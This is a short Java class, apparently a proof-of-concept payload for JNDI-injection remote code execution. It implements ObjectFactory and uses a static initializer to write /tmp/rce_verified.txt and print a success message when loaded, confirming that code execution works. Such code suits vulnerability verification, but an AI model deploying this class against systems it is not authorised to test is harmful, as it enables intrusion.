import java.io.File;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class VerifyRce implements ObjectFactory {
    static {
        try {
            new File("/tmp/rce_verified.txt").createNewFile();
            System.out.println("[SUCCESS] RCE Verified!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return "RCE_OK";
    }
}
